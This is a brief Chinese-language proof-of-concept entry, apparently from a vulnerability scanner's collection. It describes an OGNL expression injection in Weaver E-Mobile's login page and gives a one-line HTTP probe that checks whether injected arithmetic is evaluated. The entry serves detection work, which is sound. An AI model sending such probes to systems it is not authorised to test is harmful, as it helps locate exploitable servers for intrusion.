﻿# 泛微 E-mobile 前台存在ognl表达式注入

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：泛微 E-Mobile 前台存在ognl表达式注入

> 漏洞特征：

> 验证脚本：HTTP

```
GET /login.do?message=12345-5 HTTP/1.1
```

> 响应代码特征：-1

> 响应内容特征：12340

> 上传文件定位：

> 验证文件来源：泛微 E-mobile 前台存在ognl表达式注入.poc
